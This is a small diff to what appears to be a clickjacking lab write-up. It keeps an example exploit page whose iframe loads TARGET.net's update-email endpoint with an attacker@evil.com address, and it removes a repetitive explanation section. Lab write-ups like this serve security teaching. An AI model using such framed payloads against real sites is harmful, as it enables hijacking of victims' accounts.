@@ -37,11 +37,3 @@ Example exploit page:
 </div>
 <iframe src="https://TARGET.net/update-email?email=attacker@evil.com"></iframe>
 ```
-
-### Why It Works
-
-This lab extends the basic clickjacking example in Lab: Basic clickjacking with CSRF token protection.
-
-### Key Takeaways
-
-- This lab extends the basic clickjacking example in Lab: Basic clickjacking with CSRF token protection.
